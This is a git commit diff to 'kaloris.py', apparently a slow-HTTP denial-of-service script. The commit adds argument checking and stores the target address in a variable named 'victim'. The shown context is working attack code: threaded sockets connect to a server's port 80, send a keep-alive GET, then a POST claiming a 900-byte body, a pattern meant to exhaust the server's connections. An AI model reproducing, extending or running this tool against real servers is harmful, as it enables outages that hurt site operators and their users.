43b1f338a78152fc478a212b8d98910563f48859
Twitch <SixTwelveOhTwo@gmail.com>
2010-07-21 11:47:36 -0700

    Adding basic input validation and variable-izing the target.

--- kaloris.py
+++ kaloris.py
@@ -5,18 +5,23 @@
 
 import sys, socket, time, threading as th, os
 
+# Crude Input Validation
+if len(sys.argv) != 2: 
+	sys.stderr.write("        Syntax error! Correct usage:\n%s <target IP> e.g. %s 127.0.0.1\n\n" % (sys.argv[0], sys.argv[0]))
+	sys.exit(2)
+
+
 # Defines:
 contlen = 10
-
+victim = sys.argv[1]
 kaopen = "GET / HTTP/1.1\r\nHost: kaloris.omnom\r\nUser-Agent: bonk!\r\nConnection: Keep-Alive\r\n\r\n"
-
 msgstart = "POST /index.php HTTP/1.1\r\nHost: slowfox.com\r\nContent-Length: 900\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n"
 
 class clith(th.Thread):
 	def run(self):
 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		s.setsockopt(socket.SOL_TCP, socket.TCP_NODELAY, 1)
-		s.connect((sys.argv[1], 80))
+		s.connect((victim, 80))
 		s.send(kaopen)
 		time.sleep(.5) # This is necessary to prevent Nagle-like behavior. Surprisingly NODELAY did _not_ do the trick.
 		s.send(msgstart)
